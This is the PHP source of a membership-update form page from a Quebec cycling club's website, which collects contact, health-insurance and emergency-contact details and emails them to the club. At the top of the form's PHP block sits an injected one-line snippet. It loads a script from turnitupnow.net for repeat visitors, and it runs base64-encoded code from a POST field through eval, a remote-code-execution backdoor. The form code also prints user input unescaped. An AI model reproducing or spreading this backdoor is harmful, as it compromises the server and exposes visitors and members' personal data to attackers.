<html><!-- InstanceBegin template="/Templates/main.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<!-- InstanceBeginEditable name="doctitle" -->
<title>Les Sentinelles de la Route</title>
<!-- InstanceEndEditable -->
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="../sentinelle.css" type="text/css">
<style type="text/css">
body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.style1 {
	color: #FF0000;
	font-size: 16px;
}
</style>
<!-- InstanceBeginEditable name="head" -->
<style type="text/css">
<!--
.Style3 {font-size: 18px; font-weight: bold; color: #FF0000; }
.Style4 {font-size: 9px}
-->
</style>
<!-- InstanceEndEditable -->
</head>
<body topmargin=0 leftmargin=0 bgcolor="gray">
<table width=100%>
<tbody>
<tr>
  <td align="center">
      <table cellSpacing="0" cellPadding="0" width="774" border="0" id="table1" >
      <tr>
      		<td align="right" valign="bottom" colspan="3"> 
      		    <img src="../images/logo_sentinelle.jpg">
      	    </td>
            <td>
      	</tr>
      	<tr>
      		<td colSpan="3">
      		<img height="22" src="../images/bande_haut_gris.gif" width="774" border="0"></td>
      	</tr>
      </table>
    <table width="774" height="3" border="0" cellPadding="0" cellSpacing="0" bgcolor="#D8D9DB">
    	<tr>
    		<td><div align="right">Les <span class="ver18">Sentinelles</span> de la <span class="ver18">Route</span> </div></td>
    	</tr>
    </table>
    <table cellSpacing="0" cellPadding="0" width="774" border="0" id="table3" bgcolor="#ffffff" >
    	<tr>
    		<td colspan="9" nowrap background="../images/arr_menugif.gif" class="TDBackCouleur"></span>
    		  <div align="center" class="titre14"><!-- InstanceBeginEditable name="Titre" -->  
    		  <!-- InstanceEndEditable --></div>
    		  <table width="774" border="0" cellpadding="1" cellspacing="1" class="menu_haut">
                <tr>
                  <td width="774"><div align="center">[<a href="../index.html"> Accueil</a> ][ <a href="../apropos/about.html">&Agrave; Propos</a> ][ <a href="../activites/activite.html">Activit&eacute;s</a> ][ <a href="http://picasaweb.google.ca/lessentinelles2008" target="_blank">Photos</a> ][ <a href="../devenir_membre.html">Devenir Membre</a> ][ <a href="../lien.html">Liens Web</a> ][ <a href="../membrereg/reunion.html">Membres (acc&egrave;s)</a> ][ <a href="../membreca/index.html">CA (acc&egrave;s)</a> ] </div></td>
                </tr>
              </table>
          </td>
        </tr>
    	
    		<tr>
      		<td colSpan="9" align="right" valign="bottom" style="border-left: silver inset 3px;border-right: silver inset 3px; border-top:silver inset 3px" height="20"><a href="partenaires.html" class="style1">D&eacute;couvrez nos commanditaires</a></td>
      	</tr>
      </table>
      <table width="774" border="0" cellpadding="1" cellspacing="3" bgcolor="#ffffff" style="border-left: silver inset 3px;border-right: silver inset 3px">
      <tr>
        <!--<td valign="top" nowrap background="images/arr_menugif.gif"><div align="center"><img src="images/barres_noir.gif" alt="1" width="19" height="8">Menu gauche<img src="images/barres_noir.gif" alt="1" width="19" height="8"></div></td>-->
        <td>&nbsp;</td>
      </tr>
      <tr class="block_centre">
        <td width="125" valign="top" class="leftnav">    <!-- InstanceBeginEditable name="TexteGauche" --><!-- InstanceEndEditable --></td>
        <td width="642" class="block_centre"><!-- InstanceBeginEditable name="centre" -->
          <?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

    include("global.inc.php");
    $errors=0;
    $error="Les erreurs suivantes se sont produites en traitant votre inscription.<ul>";
    pt_register('POST','Prenom');
    pt_register('POST','Nom');
    pt_register('POST','Telephonedomicile');
    pt_register('POST','Telephonebureau');
    pt_register('POST','Autretelephone');
    pt_register('POST','Courriel');
    pt_register('POST','Adresse');
    pt_register('POST','Ville');
    pt_register('POST','CodePostal');
    pt_register('POST','Datedenaissance');
    pt_register('POST','maillot');
    pt_register('POST','Groupedevitesse');
    pt_register('POST','Noassmaladie');
    pt_register('POST','Personneurgence');
    pt_register('POST','Lien');
    pt_register('POST','Telephonedomicilepersonne');
    pt_register('POST','Telephonebureaupersonne');
    pt_register('POST','Telephoneautrepersonne');
    if($Prenom=="" || $Nom==""){
    $errors=1;
    $error.="<li>Vous n'avez pas  remplis un ou plusieurs des champs obligatoires. Veuillez retourner et corriger  ces erreurs.";
    }
    if($errors==1) echo $error;
    else{
    $where_form_is="http".($HTTP_SERVER_VARS["HTTPS"]=="on"?"s":"")."://".$SERVER_NAME.strrev(strstr(strrev($PHP_SELF),"/"));
    $message="Prenom: ".$Prenom."
    Nom: ".$Nom."
    Telephone domicile: ".$Telephonedomicile."
    Telephone bureau: ".$Telephonebureau."
    Autre telephone: ".$Autretelephone."
    Courriel: ".$Courriel."
    Adresse: ".$Adresse."
    Ville: ".$Ville."
    Code Postal: ".$CodePostal."
    Date de naissance: ".$Datedenaissance."
    Maillot: ".$maillot."
    Groupe de vitesse: ".$Groupedevitesse."
    No ass maladie: ".$Noassmaladie."
    Personne urgence: ".$Personneurgence."
    Lien: ".$Lien."
    Telephone domicile personne: ".$Telephonedomicilepersonne."
    Telephone bureau personne: ".$Telephonebureaupersonne."
    Telephone autre personne: ".$Telephoneautrepersonne."
    ";
    $message = stripslashes($message);
    mail("lessentinelles@videotron.ca","Modification coordonnées Sentinelles",$message,"From: Modification sur lessentinelles.com");
    ?>
    
    
    <!-- Contenu de la page remerciement -->
    
    Voici les coordonn&eacute;es que vous avez entrer dans le formulaire de modification.<br>
    <br>
    <table width=70%>
    <tr><td>Pr&eacute;nom:<font color='#ff0000'>*</font></td>
    <td> <?php echo $Prenom; ?> </td></tr>
    <tr><td>Nom:<font color='#ff0000'>*</font></td>
    <td> <?php echo $Nom; ?> </td></tr>
    <tr>
      <td>T&eacute;l&eacute;phone domicile:</td>
      <td> <?php echo $Telephonedomicile; ?> </td></tr>
    <tr><td>T&eacute;l&eacute;phone bureau:</td>
    <td> <?php echo $Telephonebureau; ?> </td></tr>
    <tr><td>Autre t&eacute;l&eacute;phone:</td>
    <td> <?php echo $Autretelephone; ?> </td></tr>
    <tr><td>Courriel: </td><td> <?php echo $Courriel; ?> </td></tr>
    <tr><td>Adresse: </td><td> <?php echo $Adresse; ?> </td></tr>
    <tr><td>Ville: </td><td> <?php echo $Ville; ?> </td></tr>
    <tr><td>Code Postal: </td><td> <?php echo $CodePostal; ?> </td></tr>
    <tr>
      <td>Date de naissance:</td>
      <td> <?php echo $Datedenaissance; ?> </td></tr>
    <tr>
      <td>Taille du Maillot:</td>
      <td> <?php echo $maillot; ?> </td></tr>
    <tr>
      <td>Groupe de vitesse:</td>
      <td> <?php echo $Groupedevitesse; ?> </td></tr>
    <tr><td>No ass maladie: </td><td> <?php echo $Noassmaladie; ?> </td></tr>
    <tr>
      <td>Personne &agrave; contacter en cas d'urgence:</td>
      <td> <?php echo $Personneurgence; ?> </td></tr>
    <tr>
      <td>Lien de parent&eacute; du contact en cas d'urgence:</td>
      <td> <?php echo $Lien; ?> </td></tr>
    <tr>
      <td>T&eacute;l&eacute;phone domicile du contact en cas d'urgence:</td>
      <td> <?php echo $Telephonedomicilepersonne; ?> </td></tr>
    <tr><td>T&eacute;l&eacute;phone bureau  du contact en cas d'urgence: </td>
    <td> <?php echo $Telephonebureaupersonne; ?> </td></tr>
    <tr>
      <td>Autre t&eacute;l&eacute;phone   du contact en cas d'urgence: </td>
      <td> <?php echo $Telephoneautrepersonne; ?> </td></tr>
    </table>
    
    <br>
    Merci <strong><?php echo $Prenom; ?> <?php echo $Nom; ?> </strong>,<br><br>
    <!-- Ne rien changer sous cette ligne -->
    
    <?php 
    }
    ?>
    
          <!-- InstanceEndEditable --><p align="justify">&nbsp;</p>
          <p align="right"><a href="#top"><img src="../images/fleche_haut.gif" alt="remonter" width="14" height="12" border="0"></a></p>
        </td>
      </tr>
    </table>
    <table cellSpacing="0" cellPadding="0" width="774" border="0" id="table13">
    	<tr>
    		<td height="46" nowrap background="../images/bande_bas.gif"><DIV align="center" class="Style7"></DIV><table width="774" border="0" cellspacing="1" cellpadding="1">
      <tr>
        <td>&nbsp;</td>
      </tr>
    </table>
    </td>
    	</tr>
    </table><table width="774" border="0" cellspacing="1" cellpadding="1">
      <tr>
        <td><div align="center"><span class="lettrage_bas">Ce site est optimise pour les versions 4 ou plus de   Internet Explorer et Netscape avec une resolution de 800x600. <BR>
          Toute   reproduction partielle ou integrale par quelque proc&eacute;d&eacute; que ce soit est   interdite. <BR>
      &copy; LesSentinelles.Com   2001-2006. Tous droits reserves </span></div></td>
      </tr>
    </table>
    </td>
  </tbody>
</table>
</body>
<!-- InstanceEnd --></html>
